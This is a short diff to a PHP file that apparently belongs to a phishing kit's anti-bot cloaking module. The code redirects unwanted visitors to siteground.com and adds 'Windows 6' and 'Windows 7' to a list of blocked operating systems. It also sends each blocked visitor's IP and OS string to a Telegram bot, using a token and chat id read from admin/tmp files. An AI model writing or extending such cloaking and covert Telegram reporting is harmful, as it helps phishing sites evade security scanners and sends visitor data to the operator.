@@ -2189,13 +2189,15 @@ header("Location: https://www.siteground.com");exit();
 $os =  strtolower($oss);
 $blocked_wor = array(
      "Unknown",
-     "unknown"
+     "unknown",
+     "Windows 6",
+     "Windows 7"
 );
 
 foreach($blocked_wor as $word3) {
         if (substr_count($os, strtolower($word3)) > 0 or $os == "" or $os == " " or $os == "    ") {
 
-$content = "Bot Found: ".$IP." [ Blocked ] \r\n";
+$content = "Bot Found: ".$IP." : ".$oss." [ Blocked ] \r\n";
 $token = file_get_contents("admin/tmp/token.txt");
 $id = file_get_contents("admin/tmp/id.txt");
 $url = "https://api.telegram.org/bot";
